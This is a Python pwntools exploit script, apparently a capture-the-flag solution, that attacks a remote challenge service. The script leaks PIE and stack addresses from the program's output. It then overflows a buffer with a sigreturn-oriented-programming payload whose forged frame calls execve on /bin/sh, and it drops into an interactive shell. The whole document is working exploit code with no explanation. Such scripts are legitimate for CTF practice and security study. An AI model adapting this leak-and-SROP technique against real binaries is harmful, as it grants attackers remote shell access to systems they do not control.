from pwn import *

context.clear(arch='amd64')
#context.log_level = 'debug'

r = remote('challenges1.gcc-ctf.com', 4004)

r.sendlineafter(b'> ', b'2000')

r.sendlineafter(b'> ', b'')

r.recvline()
r.recvline()

a = r.recvuntil(b'\x18')
leak = 0x18
a = r.recvline()[:8]
index = 1
for i in a:
    if i == b'\x00':
        break
    leak += i * pow(256, index)
    index += 1

print("PIE leak: ", hex(leak))

zero_rax = leak - 0x114
handle_rax = leak - 0x10c

r.sendlineafter(b'> ', b'2000')
r.sendlineafter(b'> ', b'')
r.recvline()
a = r.recvline()

stack = b''
for i in range(len(a)):
    if a[i] == 127:
        stack = a[i-8:i+1]
        break
s_l = 0
index = 0
for i in stack:
    if i == 0 and index == 0:
        continue
    s_l += pow(256, index)*i
    index += 1

print(hex(s_l))
b = (r.recvuntil(b'string'))
b = b[::-1]
print(b)
print(len(b))
bytesarr = []
for i in range(len(b)):
    if b[i] == 127:
        for j in range(8):
            bytesarr.append(b[i+j])
        break
print(bytesarr)
bytesarr = bytesarr[::-1]
fin_leak = 0
index = 0
for i in range(8):
    if bytesarr[i] == 0 and index == 0:
        continue
    fin_leak += pow(256,index) * bytesarr[i]
    index += 1

print(hex(fin_leak))
fin_leak -=1

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = fin_leak - 0x200
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = s_l
frame.rip = leak - 0xe4

pay = b'/bin/sh\x00' * (520//8) + p64(zero_rax) + 14*p64(handle_rax) + p64(leak-0xe4)
pay += bytes(frame)

r.sendlineafter(b'> ', b'1111111')
r.sendlineafter(b'> ', pay)

r.interactive()
